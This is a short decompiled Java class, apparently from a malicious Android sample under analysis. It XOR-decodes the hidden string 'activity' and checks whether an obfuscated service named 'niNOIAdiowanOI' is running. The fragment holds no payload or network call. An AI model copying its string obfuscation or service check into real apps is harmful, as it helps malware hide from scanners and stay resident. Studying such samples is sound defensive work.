package com.zjxyxnvvp.nxvxchltf;

import android.app.ActivityManager;
import android.content.Context;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class g {
    private static short[] $ = {7230, 7228, 7211, 7222, 7209, 7222, 7211, 7206};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static boolean a(Context context) {
        for (ActivityManager.RunningServiceInfo runningServiceInfo : ((ActivityManager) context.getSystemService($(0, 8, 7263))).getRunningServices(Integer.MAX_VALUE)) {
            if (niNOIAdiowanOI.class.getName().equals(runningServiceInfo.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
